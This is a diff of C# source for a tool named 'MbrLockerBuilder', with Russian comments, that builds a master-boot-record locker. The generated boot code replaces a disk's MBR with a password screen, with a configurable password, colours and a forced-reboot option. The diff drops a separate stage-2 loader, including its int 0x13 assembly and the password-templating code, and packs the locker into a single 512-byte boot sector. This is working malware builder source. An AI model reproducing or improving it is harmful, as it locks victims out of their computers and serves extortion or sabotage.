@@ -433,30 +433,17 @@ namespace MbrLockerBuilder
                 this.lblStatus.Text = "3/7 Компиляция Stage2...";
                 Application.DoEvents();
 
-                string stage2Asm = this.GenerateStage2();
-                string stage2Path = Path.Combine(Path.GetTempPath(), "stage2.asm");
-                File.WriteAllText(stage2Path, stage2Asm, Encoding.ASCII);
-
-                string stage2BinPath = Path.Combine(Path.GetTempPath(), "stage2.bin");
-                RunNasm(nasmPath, stage2Path, stage2BinPath);
-                byte[] stage2Bytes = File.ReadAllBytes(stage2BinPath);
-
-                // ПРОВЕРКА: Stage2 должен быть не пустым
-                if (stage2Bytes.Length < 100 || stage2Bytes[0] != 0xB8)
-                {
-                    MessageBox.Show($"Ошибка: Stage2 не скомпилирован! Размер: {stage2Bytes.Length} байт, первый байт: 0x{stage2Bytes[0]:X2}",
-                        "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    return;
-                }
+                // Stage2 больше не нужен — он встроен в MBR
+                byte[] stage2Bytes = new byte[0];
 
                 this.lblStatus.Text = "4/7 Сборка образа...";
                 Application.DoEvents();
 
-                // НОВАЯ СТРУКТУРА: 23 сектора (0-22)
-                int totalSectors = 23;
+                // СТРУКТУРА: 16 секторов, шрифт 8 секторов (4096 байт)
+                int totalSectors = 16;
                 byte[] fullImage = new byte[512 * totalSectors];
 
-                // 1. MBR (сектор 0)
+                // 1. MBR (сектор 0) — содержит весь код
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
 
                 // 2. Шрифт (сектора 3-10) — 8 секторов = 4096 байт
@@ -489,9 +476,6 @@ namespace MbrLockerBuilder
                 byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(bodyText);
                 if (bodyBytes.Length > 512) Array.Resize(ref bodyBytes, 512);
                 Array.Copy(bodyBytes, 0, fullImage, 512 * 12, bodyBytes.Length);
-
-                // 5. Stage2 (сектор 13) — 1 сектор
-                Array.Copy(stage2Bytes, 0, fullImage, 512 * 13, Math.Min(stage2Bytes.Length, 512));
 
                 this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
@@ -623,80 +607,6 @@ start:
     mov sp, 0x7C00
     sti
 
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x8000
-    mov ah, 0x02
-    mov al, 1
-    mov ch, 0
-    mov cl, 13
-    mov dh, 0
-    mov dl, 0x80
-    int 0x13
-    jc load_error
-
-    jmp 0x0000:0x8000
-
-load_error:
-    mov si, msg_error
-    call print
-    jmp hang
-
-print:
-    lodsb
-    or al, al
-    jz .done
-    mov ah, 0x0E
-    int 0x10
-    jmp print
-.done:
-    ret
-
-hang:
-    cli
-    hlt
-    jmp hang
-
-msg_error:
-    db 'Load error!', 0
-
-times 510 - ($ - $$) db 0
-dw 0xAA55";
-        }
-
-        private string GenerateStage2()
-        {
-            string template = null;
-
-            try
-            {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.stage2.asm"))
-                {
-                    if (stream != null)
-                    {
-                        using (StreamReader reader = new StreamReader(stream))
-                        {
-                            template = reader.ReadToEnd();
-                        }
-                    }
-                }
-            }
-            catch { }
-
-            if (string.IsNullOrEmpty(template))
-            {
-                string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "stage2.asm");
-                if (File.Exists(localPath))
-                    template = File.ReadAllText(localPath);
-            }
-
-            if (string.IsNullOrEmpty(template))
-            {
-                template = @"
-BITS 16
-ORG 0x8000
-
-start_stage2:
     mov ax, 0x0003
     int 0x10
 
@@ -910,57 +820,16 @@ password:
 buffer:
     times 64 db 0
 password_ok:
-    db 0";
-            }
+    db 0
 
-            string password = this.txtPassword.Text.Trim();
-            if (string.IsNullOrEmpty(password)) password = "admin";
+times 510 - ($ - $$) db 0
+dw 0xAA55";
+        }
 
-            string passwordHex;
-            if (ContainsRussian(password))
-            {
-                string cleanPassword = new string(password.Where(c => c < 128).ToArray());
-                if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
-                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
-            }
-            else
-            {
-                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
-            }
-
-            template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
-
-            string textColor = "0A";
-            switch (this.cmbTextColor.SelectedIndex)
-            {
-                case 0: textColor = "0A"; break;
-                case 1: textColor = "0C"; break;
-                case 2: textColor = "0F"; break;
-                case 3: textColor = "0B"; break;
-                case 4: textColor = "0E"; break;
-                case 5: textColor = "0D"; break;
-            }
-
-            string bgColor = "00";
-            switch (this.cmbBgColor.SelectedIndex)
-            {
-                case 0: bgColor = "00"; break;
-                case 1: bgColor = "10"; break;
-                case 2: bgColor = "40"; break;
-                case 3: bgColor = "20"; break;
-            }
-
-            bool enableBSOD = this.chkBSOD.Checked;
-
-            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
-            template = template.Replace("mov ax, 0x0A00", "mov ax, 0x" + textColor + "00");
-
-            if (enableBSOD)
-            {
-                template = template.Replace("jmp hang", "int 0x19");
-            }
-
-            return template;
+        private string GenerateStage2()
+        {
+            // Stage2 больше не нужен — он встроен в MBR
+            return "";
         }
 
         private string FindResourceByPartialName(string partialName, string fileName)
